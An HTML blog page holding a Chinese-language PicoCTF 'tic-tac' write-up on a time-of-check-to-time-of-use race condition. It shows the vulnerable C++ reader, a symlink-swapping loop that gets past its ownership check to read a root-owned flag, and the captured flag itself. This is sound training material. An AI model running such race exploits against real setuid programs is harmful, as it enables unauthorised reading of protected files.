<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - tic-tac
  #


  Background
  #

後端工程師面試考什麼 - Race Condition 篇
 [Day24]攻擊篇 

TOCTTOU
Time of check to time of use
在檢查和使用之間影響資源狀態的攻擊
這種攻擊可能發生在共享資源中。
可能導致程式在資源處於意外狀態時執行無效操作。

  Source code
  #

:::spoiler Source code
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file&#39;s status information.
  if (stat(filename.c_str(), &amp;statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file&#39;s owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don&#39;t own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - tic-tac"><meta property="og:description" content='PicoCTF - tic-tac # Background # 後端工程師面試考什麼 - Race Condition 篇 [Day24]攻擊篇 TOCTTOU
Time of check to time of use 在檢查和使用之間影響資源狀態的攻擊
這種攻擊可能發生在共享資源中。 可能導致程式在資源處於意外狀態時執行無效操作。
Source code # :::spoiler Source code
#include <iostream> #include <fstream> #include <unistd.h> #include <sys/stat.h> int main(int argc, char *argv[]) { if (argc != 2) { std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl; return 1; } std::string filename = argv[1]; std::ifstream file(filename); struct stat statbuf; // Check the file&#39;s status information. if (stat(filename.c_str(), &amp;statbuf) == -1) { std::cerr << "Error: Could not retrieve file information" << std::endl; return 1; } // Check the file&#39;s owner. if (statbuf.st_uid != getuid()) { std::cerr << "Error: you don&#39;t own this file" << std::endl; return 1; } // Read the contents of the file. if (file.is_open()) { std::string line; while (getline(file, line)) { std::cout << line << std::endl; } } else { std::cerr << "Error: Could not open file" << std::endl; return 1; } return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>PicoCTF - tic-tac | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - tic-tac</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---tic-tac>PicoCTF - tic-tac
<a class=anchor href=#picoctf---tic-tac>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://myapollo.com.tw/blog/interview-question-race-condition/>後端工程師面試考什麼 - Race Condition 篇</a>
<a href=https://ithelp.ithome.com.tw/articles/10208763>[Day24]攻擊篇</a></p><blockquote><p>TOCTTOU</p><p>Time of check to time of use
在檢查和使用之間影響資源狀態的攻擊</p><p>這種攻擊可能發生在共享資源中。
可能導致程式在資源處於意外狀態時執行無效操作。</p></blockquote><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr &lt;&lt; &#34;Usage: &#34; &lt;&lt; argv[0] &lt;&lt; &#34; &lt;filename&gt;&#34; &lt;&lt; std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file&#39;s status information.
  if (stat(filename.c_str(), &amp;statbuf) == -1) {
    std::cerr &lt;&lt; &#34;Error: Could not retrieve file information&#34; &lt;&lt; std::endl;
    return 1;
  }

  // Check the file&#39;s owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr &lt;&lt; &#34;Error: you don&#39;t own this file&#34; &lt;&lt; std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout &lt;&lt; line &lt;&lt; std::endl;
    }
  } else {
    std::cerr &lt;&lt; &#34;Error: Could not open file&#34; &lt;&lt; std::endl;
    return 1;
  }

  return 0;
}
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>第一次寫這一種題目，具@ccccctw所說算是考古題了，看了<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>還是不知道怎麼做出來的，所以問了@ccccctw</p><ol><li>可以看到source code是檢查root權限才可以讀到flag</li><li>用兩次soft link讓這支程式呈現race condiction的狀態(不見得每次都會所以要靠賽)</li><li>首先要先用一個infinity while loop創兩個soft link，然後在背景執行，第一次的soft link(<code>$ ln -sf test1 test</code>)是為了要過掉root權限的檢查，而第二次的soft link(<code>ln -sf flag.txt test</code>)是用來讀flag的
具體來說是這樣：
test的link會在flag.txt和test1之間切換，若我們用txtreader讀取test時，會有權限檢查，如果此時的link是test1，權限檢查就會通過，此時如果剛好test的link指向flag.txt，那我們就可以無縫的讀取到flag.txt的內容</li><li>接著就可以用他的txtreader讀取test，如果幸運的話就可以讀到需要root權限的flag</li></ol><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh ctf-player@saturn.picoctf.net -p <span style=color:#ae81ff>59620</span>
</span></span><span style=display:flex><span>$ touch test1
</span></span><span style=display:flex><span>$ <span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span> ln -sf flag.txt test; ln -sf test1 test; <span style=color:#66d9ef>done</span> &amp;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#ae81ff>3039</span>
</span></span><span style=display:flex><span>$ <span style=color:#66d9ef>for</span> i in <span style=color:#f92672>{</span>1..1000<span style=color:#f92672>}</span>;<span style=color:#66d9ef>do</span> ./txtreader test; <span style=color:#66d9ef>done</span> &gt; output
</span></span><span style=display:flex><span>$ cat output
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>ToctoU_!s_3a5y_007659c9<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Flag: <code>picoCTF{ToctoU_!s_3a5y_007659c9}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#tic-tac>tic-tac maple</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://youtu.be/ONMVfKDqCr0>picoCTF 2023 tic-tac</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://youtu.be/b1-Aw96zysM>TicTac (TOCTOU attack) - Pico CTF 2023 - Race Condition </a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>